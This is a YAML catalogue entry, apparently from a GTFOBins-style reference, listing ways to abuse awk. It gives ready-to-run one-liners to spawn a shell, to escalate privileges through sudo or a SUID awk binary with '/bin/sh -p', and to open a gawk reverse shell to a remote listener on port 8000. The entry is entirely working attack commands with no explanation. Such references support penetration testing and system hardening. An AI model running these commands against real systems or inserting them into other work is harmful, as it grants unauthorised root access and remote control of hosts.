---
functions:
  exec-interactive:
    - code: awk 'BEGIN {system("/bin/sh")}'
  sudo-enabled:
    - code: sudo awk 'BEGIN {system("/bin/sh -p")}'
  suid-limited:
    - code: ./awk 'BEGIN {system("/bin/sh -p")}'
  reverse-shell:
    - description: Run `nc -l -p 8000` to receive the shell on the other end.
      code: awk -v RHOST=localhost -v RPORT=8000 'BEGIN {s = "/inet/tcp/0/" RHOST "/" RPORT; while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s;}}'
---
